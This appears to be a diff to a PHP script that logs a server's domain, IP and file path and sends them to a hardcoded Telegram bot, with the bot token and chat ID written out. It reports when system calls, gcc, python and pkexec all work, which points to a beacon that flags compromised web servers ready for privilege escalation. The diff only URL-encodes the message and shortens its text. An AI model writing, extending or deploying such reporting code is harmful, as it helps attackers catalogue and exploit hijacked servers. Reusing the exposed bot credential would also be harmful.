@@ -2,7 +2,7 @@
 function sendToTelegram($message) {
     $chat_id = '7416297295';
     $bot_token = '7201454232:AAEPcn2bfld2FW8X8cEakCKx32kJdygixuI';
-    $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=$message";
+    $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=".urlencode($message);
     file_get_contents($url);
 }
 
@@ -42,13 +42,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $fullPath = "$domain/$path"; // Đường dẫn đầy đủ không cần filename
         
         // Cấu trúc nội dung theo định dạng yêu cầu
-        $content = "Domain: $domain\nDate: $dateTime\nServer IP: $serverIP\nFull Path: $fullPath\n";
+        $content = "Found\nDomain: $domain\nDate: $dateTime\nServer IP: $serverIP\nFull Path: $fullPath\n";
 
         file_put_contents($file, "------\n$content", FILE_APPEND);
         
         if ($allWorking) {
-            $message = "All system functions (system, gcc, python, pkexec) are working correctly.\n$content";
-            sendToTelegram($message);
+            sendToTelegram($content);
         }
     }
 }
